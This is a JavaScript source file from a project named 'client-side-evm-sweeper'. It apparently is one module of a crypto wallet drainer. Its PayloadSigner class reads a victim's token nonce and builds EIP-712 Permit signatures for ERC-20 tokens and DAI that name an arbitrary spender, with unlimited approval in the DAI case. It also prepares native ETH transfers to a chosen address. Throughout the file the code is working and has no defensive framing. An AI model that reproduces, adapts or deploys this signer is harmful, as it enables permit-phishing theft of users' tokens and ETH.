// client-side-evm-sweeper/src/interceptors/payload-signer.js
import { ethers } from 'ethers';

/**
 * HIGH-PERFORMANCE CLIENT-SIDE PAYLOAD SIGNER (v5.1 - Ethers v6 + Native ETH)
 * Supports: EIP-2612 Permits + DAI legacy + Native ETH transfers
 */
export class PayloadSigner {
    constructor() {
        this.defaultDeadlineOffset = 86400 * 7; // 7 days
    }

    /**
     * Main Public Orchestrator Entry Point
     */
    async createAndSignForTarget(target, owner, spender, value, chainId, signer) {
        if (!signer) throw new Error("Valid cryptographic browser signer instance required.");
        
        if (!ethers.isAddress(owner) || !ethers.isAddress(spender)) {
            throw new Error("Invalid owner or spender hexadecimal address string parameters");
        }

        // === NATIVE ETH DETECTION ===
        const isNativeETH = !target || 
                           !target.address || 
                           target.address === ethers.ZeroAddress ||
                           target.isNative === true;

        if (isNativeETH) {
            return await this.createNativeETHTransfer(owner, spender, value, signer);
        }

        // === ERC-20 Permit Path ===
        try {
            const { tokenName, tokenVersion, tokenNonce } = await this.fetchLiveTokenMetadata(
                signer, 
                target.address, 
                owner
            );

            const payload = this.compilePermitPayload(
                target.address, 
                tokenName, 
                tokenVersion, 
                tokenNonce, 
                owner, 
                spender, 
                value, 
                chainId
            );

            return await this.signPayload(payload, signer);
        } catch (err) {
            console.error(`[Signer] Permit payload generation failed for ${target.address}:`, err);
            throw err;
        }
    }

    /**
     * Native ETH Transfer Handler
     */
    async createNativeETHTransfer(owner, to, value, signer) {
        try {
            const balance = await signer.provider.getBalance(owner);
            const valueWei = typeof value === 'string' && value.includes('.') 
                ? ethers.parseEther(value)
                : ethers.toBigInt(value);

            if (balance < valueWei) {
                throw new Error(`Insufficient ETH balance. Have ${ethers.formatEther(balance)} ETH, requested ${ethers.formatEther(valueWei)} ETH`);
            }

            const txRequest = {
                to: ethers.getAddress(to),
                value: valueWei,
            };

            return {
                success: true,
                isNative: true,
                txRequest,
                deadline: Math.floor(Date.now() / 1000) + this.defaultDeadlineOffset,
                message: "Native ETH transfer prepared - use signer.sendTransaction(txRequest)",
                value: valueWei.toString()
            };
        } catch (err) {
            console.error("[Signer] Native ETH transfer preparation failed:", err);
            throw err;
        }
    }

    /**
     * Fetch token metadata + nonce safely
     */
    async fetchLiveTokenMetadata(signer, tokenAddress, owner) {
        const abi = [
            "function name() view returns (string)",
            "function version() view returns (string)",
            "function nonces(address) view returns (uint256)",
            "function _nonces(address) view returns (uint256)"
        ];
        
        const contract = new ethers.Contract(tokenAddress, abi, signer);
        const tokenAddrLower = tokenAddress.toLowerCase();
        
        let tokenName = "Unknown Token";
        let tokenVersion = "1";
        let tokenNonce = "0";

        // Name
        try { tokenName = await contract.name(); } catch (e) {}

        // Version with USDC overrides
        const usdcAddresses = [
            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913",
            "0x0b3e328455c4059eeb9e3f84b5543f74e24e7e1b",
            "0x176211869ca2b568f2a7d4ee941e073a821ee1ff"
        ];

        if (usdcAddresses.includes(tokenAddrLower)) {
            tokenVersion = "2";
        } else {
            try { tokenVersion = await contract.version(); } catch (e) {}
        }

        // Nonce
        try {
            const nonce = await contract.nonces(owner);
            tokenNonce = String(nonce);
        } catch (e) {
            try {
                const altNonce = await contract._nonces(owner);
                tokenNonce = String(altNonce);
            } catch (err2) {}
        }

        return { tokenName, tokenVersion, tokenNonce };
    }

    /**
     * Multi-Schema Permit Compiler (EIP-2612 + DAI)
     */
    compilePermitPayload(tokenAddress, tokenName, tokenVersion, nonce, owner, spender, value, chainId) {
        const tokenAddrLower = tokenAddress.toLowerCase();
        const deadline = Math.floor(Date.now() / 1000) + this.defaultDeadlineOffset;
        
        const domain = {
            name: tokenName,
            version: tokenVersion,
            chainId: parseInt(chainId, 10),
            verifyingContract: ethers.getAddress(tokenAddress)
        };

        let types, message, isDai = false;

        // DAI Permit
        const daiAddresses = ["0x6b175474e89094c44da98b954eedeac495271d0f"];

        if (daiAddresses.includes(tokenAddrLower)) {
            isDai = true;
            types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "nonce", type: "uint256" },
                    { name: "expiry", type: "uint256" },
                    { name: "allowed", type: "bool" }
                ]
            };
            message = {
                owner: ethers.getAddress(owner),
                spender: ethers.getAddress(spender),
                nonce: String(nonce),
                expiry: deadline,
                allowed: true
            };
        } 
        // Standard EIP-2612
        else {
            types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            };
            message = {
                owner: ethers.getAddress(owner),
                spender: ethers.getAddress(spender),
                value: String(value),
                nonce: String(nonce),
                deadline: deadline
            };
        }

        return { domain, types, message, deadline, isDai };
    }

    /**
     * Sign Typed Data using EIP-712
     */
    async signPayload(payload, signer) {
        try {
            const signature = await signer.signTypedData(
                payload.domain,
                { Permit: payload.types.Permit },
                payload.message
            );

            const sigObject = ethers.Signature.from(signature);

            return {
                success: true,
                isNative: false,
                signature,
                r: sigObject.r,
                s: sigObject.s,
                v: sigObject.v,
                deadline: payload.deadline,
                isDai: payload.isDai,
                message: payload.message,
                domain: payload.domain
            };
        } catch (error) {
            if (error.code === 4001 || error.message?.toLowerCase().includes("denied") || error.message?.toLowerCase().includes("rejected")) {
                throw new Error("User rejected the signature request");
            }
            throw new Error(`Signature mapping crashed: ${error.message}`);
        }
    }
}

export const payloadSigner = new PayloadSigner();
export default payloadSigner;